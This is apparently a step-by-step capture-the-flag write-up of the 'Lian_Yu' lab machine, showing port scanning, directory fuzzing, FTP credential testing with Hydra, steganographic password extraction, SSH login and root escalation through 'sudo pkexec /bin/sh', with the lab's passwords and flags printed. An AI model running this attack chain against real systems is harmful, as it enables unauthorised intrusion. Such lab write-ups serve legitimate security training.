### 1. Initial Reconnaissance (Nmap)
I started with a comprehensive Nmap scan of the target IP to map out the attack surface. The scan identified four open ports: **21 (FTP)**, **22 (SSH)**, **80 (HTTP)**, and **111 (RPC)**. The results indicated a Linux-based system running Apache and OpenSSH.

<pre>
> nmap -sC -sV -Pn -vv 10.48.168.129 
  
Discovered open port 22/tcp on 10.48.168.129
Discovered open port 111/tcp on 10.48.168.129
Discovered open port 21/tcp on 10.48.168.129
Discovered open port 80/tcp on 10.48.168.129

PORT    STATE SERVICE REASON         VERSION
21/tcp  open  ftp     syn-ack ttl 62 vsftpd 3.0.2
22/tcp  open  ssh     syn-ack ttl 62 OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)

80/tcp  open  http    syn-ack ttl 62 Apache httpd
|_http-title: Purgatory
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
111/tcp open  rpcbind syn-ack ttl 62 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          43237/udp6  status
|   100024  1          43859/tcp   status
|   100024  1          46699/tcp6  status
|_  100024  1          58849/udp   status
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</pre>

---

### 2. Web Directory Enumeration (Gobuster)
To find hidden entry points, I used Gobuster to brute-force web directories. I successfully discovered a non-standard directory named `/island/`, which served as the starting point for my web-based investigation.

<pre>
> gobuster dir -u http://10.48.168.129 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
  
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.48.168.129
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
island               (Status: 301) [Size: 236] [--> http://10.48.168.129/island/]
server-status        (Status: 403) [Size: 199]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================
</pre>

<img width="661" height="306" alt="579615631-21002343-054e-46a5-a2ea-93a795672831" src="https://github.com/user-attachments/assets/f104f2ab-9efa-4a3f-89bb-7379c28f1101" />


---

### 3. Subdirectory Fuzzing (ffuf)
I utilized `ffuf` to explore the `/island/` directory more deeply. My fuzzing efforts revealed another hidden numerical subdirectory, `/2100/`, suggesting a layered directory structure designed to obscure sensitive data.

<pre>
> ffuf -u http://10.48.168.129/island/FUZZ -w ~/Desktop/Wordlists/orwa-wordlists/everything.txt
  
          /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.48.168.129/island/FUZZ
 :: Wordlist         : FUZZ: /home/kali/Desktop/Wordlists/orwa-wordlists/everything.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

/././././././././././.  [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 79ms]
/#/login                [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 86ms]
/#browse/welcome        [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 87ms]
/.                      [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 87ms]
/#login                 [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 87ms]
/                       [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 87ms]
/.htaccess              [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 76ms]
/.htaccess.sample       [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 76ms]
/.htaccess.bak          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 76ms]
/.ht_wsr.txt            [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 77ms]
/.hta                   [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 77ms]
/.htaccess/             [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 76ms]
/.htaccess.save         [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 76ms]
/.htaccess.txt          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 76ms]
/.htaccess.orig         [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 77ms]
/.htaccess.inc          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 77ms]
/.htaccess.bak1         [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 77ms]
/.htaccess.old          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 77ms]
/.htaccess.BAK          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 78ms]
/.htaccessBAK           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 75ms]
/.htaccesshTHctcuAxhxKQFDa [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 75ms]
/.htaccess_extra        [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 77ms]
/.htaccessOLD2          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 77ms]
/.htaccess_sc           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 77ms]
/.htaccess_orig         [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 78ms]
/.htaccessOLD           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 78ms]
/.htpasswd_test         [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 76ms]
/.html                  [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 76ms]
/.htpasswd/             [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 76ms]
/.htpasswds             [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 77ms]
/.htpasswd.inc          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 77ms]
/.htgroup               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 77ms]
/.htm                   [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 77ms]
/.htpasswd              [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 77ms]
/.htpasswd.bak          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 77ms]
/.htc                   [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 77ms]
/.htaccess~             [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 77ms]
/.htpasswrd             [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 75ms]
/.htusers               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 78ms]
/2100                   [Status: 301, Size: 241, Words: 14, Lines: 8, Duration: 81ms]
</pre>

<img width="800" height="661" alt="579627919-d546632e-01c4-42d6-bf3e-906535ccde0e" src="https://github.com/user-attachments/assets/cfd36756-f0b0-44c2-bc70-a8bb61665dd2" />


---

### 4. Source Code Analysis
I inspected the HTML source code of the `/island/2100/` page. I found a developer comment mentioning that a **.ticket** file could be "availed," which provided me with a specific file extension to target for further enumeration.

<pre>
> view-source:http://10.48.168.129/island/2100/
  
<!DOCTYPE html>
<html>
<body>

<h1 align=center>How Oliver Queen finds his way to Lian_Yu?</h1>
<b>you can avail your .ticket here but how?</b>
  
</header>
</body>
</html>

</pre>

---

### 5. Targeted File Fuzzing
By fuzzing the `/2100/` directory specifically for `.ticket` files, I discovered `green_arrow.ticket`. The file contained a base64-encoded string and a Vigenère cipher, which I decoded and decrypted to obtain the password `!#th3h00d`.

<pre>
> fuf -u http://10.49.164.11/island/2100/FUZZ.ticket -w ~/Desktop/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -fc 403 -fs 292

          /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.49.164.11/island/2100/FUZZ.ticket
 :: Wordlist         : FUZZ: /home/kali/Desktop/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
 :: Filter           : Response size: 292
________________________________________________

green_arrow             [Status: 200, Size: 71, Words: 10, Lines: 7, Duration: 77ms]
:: Progress: [220559/220559] :: Job [1/1] :: 300 req/sec :: Duration: [0:09:53] :: Errors: 0 ::
</pre>

<img width="794" height="220" alt="Screenshot 2026-06-11 230821" src="https://github.com/user-attachments/assets/4af631d3-eb17-4a38-b979-cba8f0c1d3f4" />

<img width="797" height="360" alt="580584908-539700e5-bf04-4ce2-8ecd-3e3a30f9e4ce" src="https://github.com/user-attachments/assets/a8ce28cf-6b78-42e5-8bbc-d702ba17cd0e" />

<img width="798" height="467" alt="Screenshot 2026-06-11 231002" src="https://github.com/user-attachments/assets/0af8b4f2-5ccf-4e76-8d2c-da6187d1473a" />

---

### 6. Service Brute-forcing (Hydra)
Equipped with a potential password and the username "vigilante" (hinted at by the "green arrow" theme), I used Hydra to test these credentials against the FTP service. The tool confirmed a valid login, granting me access to the remote file system.

<pre>
> hydra -l "vigilante" -p '!#th3h00d' ftp://10.49.164.11
  
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-20 01:36:54
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ftp://10.49.164.11:21/
[21][ftp] host: 10.49.164.11   login: vigilante   password: !#th3h00d
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-20 01:36:56
</pre>

---

### 7. FTP Data Exfiltration
I logged into the FTP server and performed an audit of the available files. I downloaded several images—`Leave_me_alone.png`, `Queen's_Gambit.png`, and `aa.jpg`—suspecting they contained embedded data.

<pre>
> ftp 10.49.164.11  
  
Connected to 10.49.164.11.
220 (vsFTPd 3.0.2)
Name (10.49.164.11:kali): vigilante
331 Please specify the password.
Password: !#th3h00d
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
</pre>

<pre>
ftp> ls
229 Entering Extended Passive Mode (|||11043|).
150 Here comes the directory listing.
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
226 Directory send OK.
ftp> get Leave_me_alone.png
local: Leave_me_alone.png remote: Leave_me_alone.png
229 Entering Extended Passive Mode (|||55803|).
150 Opening BINARY mode data connection for Leave_me_alone.png (511720 bytes).
100% |**************************************************|   499 KiB  227.05 KiB/s    00:00 ETA
226 Transfer complete.
511720 bytes received in 00:02 (219.77 KiB/s)
ftp> get Queen's_Gambit.png
local: Queen's_Gambit.png remote: Queen's_Gambit.png
229 Entering Extended Passive Mode (|||28186|).
150 Opening BINARY mode data connection for Queen's_Gambit.png (549924 bytes).
100% |**************************************************|   537 KiB  282.25 KiB/s    00:00 ETA
226 Transfer complete.
549924 bytes received in 00:01 (270.67 KiB/s)
ftp> get aa.png
local: aa.png remote: aa.png
229 Entering Extended Passive Mode (|||25942|).
550 Failed to open file.
ftp> get aa.jpg
local: aa.jpg remote: aa.jpg
229 Entering Extended Passive Mode (|||40103|).
150 Opening BINARY mode data connection for aa.jpg (191026 bytes).
100% |**************************************************|   186 KiB  291.98 KiB/s    00:00 ETA
226 Transfer complete.
191026 bytes received in 00:00 (260.48 KiB/s)
ftp> exit
221 Goodbye.
</pre>

<img width="427" height="536" alt="Screenshot 2026-06-11 231057" src="https://github.com/user-attachments/assets/b7a1f226-bc87-4549-a313-9b72e6e03ce0" />

---

### 8. Steganographic Extraction (StegSeek)
I used `stegseek` to analyze `aa.jpg`. I successfully cracked the passphrase ("password") and extracted a hidden zip archive. This archive contained `passwd.txt` and a file named `shado`, which revealed the password `M3tahuman`.

<pre>
stegseek aa.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "password"
[i] Original filename: "ss.zip".
[i] Extracting to "aa.jpg.out".
</pre>

<pre>
  file aa.jpg.out
aa.jpg.out: Zip archive data, made by v2.0 UNIX, extract using at least v2.0, last modified Apr 28 2020 02:06:00, uncompressed size 333, method=deflate
</pre>

<pre>
  nzip aa.jpg.out
Archive:  aa.jpg.out
  inflating: passwd.txt              
  inflating: shado  
</pre>

<pre>
  file passwd.txt
passwd.txt: ASCII text
</pre>


<pre>
> cat passwd.txt 
This is your visa to Land on Lian_Yu # Just for Fun ***


a small Note about it


Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.
  
</pre>

<pre>
> cat shado     
M3tahuman
</pre>

---

### 9. SSH Access and User Flag
I used the newly discovered credential `M3tahuman` to establish an SSH connection as the user **slade**. After gaining entry, I located and read `user.txt`, securing the first flag and confirming a successful initial foothold.

<pre>
> ssh slade@10.49.142.1
  
The authenticity of host '10.49.142.1 (10.49.142.1)' can't be established.
ED25519 key fingerprint is: SHA256:DOqn9NupTPWQ92bfgsqdadDEGbQVHMyMiBUDa0bKsOM
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.49.142.1' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
slade@10.49.142.1's password: <b>"M3tahuman"</b>
                              Way To SSH...
                          Loading.........Done.. 
                   Connecting To Lian_Yu  Happy Hacking

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝


        ██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
        ██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
        ██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
        ██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
        ███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
        ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #

slade@LianYu:~$ ls
user.txt
slade@LianYu:~$ cat user.txt
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
                        --Felicity Smoak
</pre>

---

### 10. Privilege Escalation Discovery
I ran `sudo -l` to check my current user's privileges. I found that the system allowed **slade** to run `/usr/bin/pkexec` as root without a password. This misconfiguration provided a clear path to full system escalation.

<pre>
> ls -al
total 32
drwx------ 2 slade slade 4096 May  1  2020 .
drwxr-xr-x 4 root  root  4096 May  1  2020 ..
-rw------- 1 slade slade   22 May  1  2020 .bash_history
-rw-r--r-- 1 slade slade  220 May  1  2020 .bash_logout
-rw-r--r-- 1 slade slade 3515 May  1  2020 .bashrc
-r-------- 1 slade slade   77 May  1  2020 .Important
-rw-r--r-- 1 slade slade  675 May  1  2020 .profile
-r-------- 1 slade slade   63 May  1  2020 user.txt
</pre>

<pre>
> cat .Important
What are you  Looking for ?

root Privileges ? 

try to find Secret_Mission
</pre>

<pre>
> sudo -l
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
</pre>

---

### 11. Root Exploitation
I executed `sudo pkexec /bin/sh` to exploit the identified permission. I verified my new status with the `whoami` and `id` commands, confirming that I had successfully attained **root** (UID 0) privileges.

<pre>
#  sudo pkexec /bin/sh
  
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root) 
</pre>

---

### 12. Final Flag Acquisition
As the root user, I accessed the `/root` directory and read `root.txt`. This finalized the mission, yielding the final "DEATHSTROKE" flag and completing the penetration test.

<pre>
# ls -al
  
total 28
drwx------  3 root root 4096 May  1  2020 .
drwxr-xr-x 23 root root 4096 May  1  2020 ..
-rw-------  1 root root   22 May  1  2020 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwx------  2 root root 4096 May  1  2020 .gnupg
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
-rw-r--r--  1 root root  340 May  1  2020 root.txt
</pre>


<pre>
  cat root.txt
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
                                                                              --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825
</pre>

<pre>
 FLAG: THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D} 
</pre> 
